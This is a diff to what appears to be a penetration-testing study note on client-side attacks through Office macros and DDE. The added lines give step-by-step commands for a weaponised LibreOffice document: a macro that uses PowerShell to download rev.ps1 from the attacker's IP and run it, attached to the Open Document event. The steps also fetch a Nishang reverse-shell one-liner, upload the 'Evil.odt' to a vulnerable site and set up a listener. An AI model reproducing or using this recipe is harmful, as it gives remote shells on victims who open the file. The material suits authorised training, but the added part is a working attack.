@@ -83,6 +83,26 @@ When leveraging client-side vulnerabilities, it is important to use applications
 The Microsoft Word macro may be one the oldest and best-known client-side software attack vectors.
 
 Microsoft Office applications like Word and Excel allow users to embed macros, a series of commands and instructions that are grouped together to accomplish a task programmatically. Organizations often use macros to manage dynamic content and link documents with external content. More interestingly, macros can be written from scratch in Visual Basic for Applications (VBA), which is a fully functional scripting language with full access to ActiveX objects and the Windows Script Host, similar to JavaScript in HTML Applications.
+````
+(open) LibreOffice Writer
+Tools > Macros > Organize Macros > Basic
+New
+Enter These commands:
+cmd /c powershell iwr http://<your ip>/rev.ps1 - o C:/Windows/Tasks/rev.ps1
+cmd /c powershell -c C:/Windows/Tasks/rev.ps1
+````
+![image](https://user-images.githubusercontent.com/127046919/224577261-f668cf22-eeda-4834-afe1-72eb34da07ef.png)
+````
+tools > organize > Events > Open Document > Macro > (find your macro and attach it)
+````
+![image](https://user-images.githubusercontent.com/127046919/224577298-3aaaf97f-e340-4ef8-a593-b24168ee8cd2.png)
+````
+vim rev.ps1
+chmod 755 rev.ps1
+wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcpOneLine.ps1 > rev.ps1
+upload File with Macro to vulnerable website #Evil.odt
+setup listner and webserver
+````
 #### Object Linking and Embedding
 Another popular client-side attack against Microsoft Office abuses Dynamic Data Exchange (DDE)1 to execute arbitrary applications from within Office documents, but this has been patched since December of 2017. In this attack scenario, we are going to embed a Windows batch file5 inside a Microsoft Word document.
 ### Hashing & Cracking
